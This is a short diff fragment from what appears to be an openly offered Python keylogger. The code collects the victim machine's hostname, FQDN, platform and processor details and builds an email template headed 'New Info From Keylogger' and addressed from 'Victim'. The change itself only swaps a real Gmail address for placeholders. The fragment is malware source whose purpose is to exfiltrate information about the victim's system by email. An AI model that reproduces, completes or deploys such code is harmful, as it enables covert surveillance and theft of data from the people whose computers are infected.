@@ -77,8 +77,8 @@ System OS: %s
 Release: %s
 Version: %s
         """ % (socket.gethostname(), socket.getfqdn(), sys.platform,platform.machine(),platform.node(),platform.platform(),platform.processor(),platform.system(),platform.release(),platform.version()) ###########
-        part1 = """From: Victim <toxicnull@gmail.com>
-To: Filip <toxicnull@gmail.com>
+        part1 = """From: Victim <xxx@gmail.com>
+To: xxxx <xxx@gmail.com>
 Subject: New Info From Keylogger
 MIME-Version: 1.0
 Content-Type: multipart/mixed; boundary=%s
